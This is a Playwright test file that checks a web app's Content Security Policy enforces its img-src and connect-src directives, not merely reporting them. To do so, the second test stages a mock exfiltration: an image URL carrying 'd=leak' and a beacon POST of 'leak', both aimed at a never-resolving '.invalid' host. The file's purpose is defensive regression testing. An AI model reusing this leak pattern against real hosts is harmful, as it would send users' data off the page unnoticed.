/**
 * #1256 — the CSP's egress directives actually BLOCK, in a real browser.
 *
 * Imports from "@playwright/test" instead of "./fixtures" on purpose: this journey
 * provokes CSP violations, and a blocked request logs a console error, which the
 * shared fixture (rightly) treats as a failure. That fixture is what makes every
 * OTHER journey a CSP regression guard for free — here we need the opposite.
 *
 * The assertion that matters is `disposition === "enforce"`: report-only fires the
 * same event with `disposition === "report"`, so a policy that only observes fails
 * this spec. That is the whole difference #1256 is about.
 */
import { expect, test } from "@playwright/test";

/** Never resolves, so nothing leaves the machine even if the policy were absent. */
const UNLISTED_HOST = "https://csp-probe.invalid";

test.describe("CSP enforcement", () => {
  test("serves the enforced header alongside the full report-only policy", async ({
    page,
  }) => {
    const response = await page.goto("/");
    const headers = response?.headers() ?? {};

    const enforced = headers["content-security-policy"] ?? "";
    expect(enforced).toContain("img-src 'self' data: https://en.numista.com");
    expect(enforced).toContain("connect-src 'self'");
    // The back door: enforcing default-src would enforce script-src/style-src too.
    expect(enforced).not.toContain("default-src");

    // The rest of the target policy keeps being observed, not dropped.
    const reportOnly = headers["content-security-policy-report-only"] ?? "";
    expect(reportOnly).toContain("default-src 'self'");
    expect(reportOnly).toContain("frame-ancestors 'none'");
  });

  test("blocks a remote image and a cross-origin fetch to an unlisted host", async ({
    page,
  }) => {
    await page.goto("/");

    const blocked = await page.evaluate(async (host) => {
      const enforcedDirectives: string[] = [];
      const listener = (event: SecurityPolicyViolationEvent) => {
        if (event.disposition === "enforce") {
          enforcedDirectives.push(event.effectiveDirective);
        }
      };
      document.addEventListener("securitypolicyviolation", listener);

      // The exfiltration shape #1246 closed at the render seam: an outbound GET
      // the browser makes with no click.
      const img = document.createElement("img");
      img.src = `${host}/pixel.png?d=leak`;
      document.body.appendChild(img);
      try {
        await fetch(`${host}/beacon`, { method: "POST", body: "leak" });
      } catch {
        // A blocked fetch rejects; the violation event is what we assert on.
      }
      await new Promise((resolve) => setTimeout(resolve, 500));

      document.removeEventListener("securitypolicyviolation", listener);
      img.remove();
      return enforcedDirectives;
    }, UNLISTED_HOST);

    expect(blocked).toContain("img-src");
    expect(blocked).toContain("connect-src");
  });
});
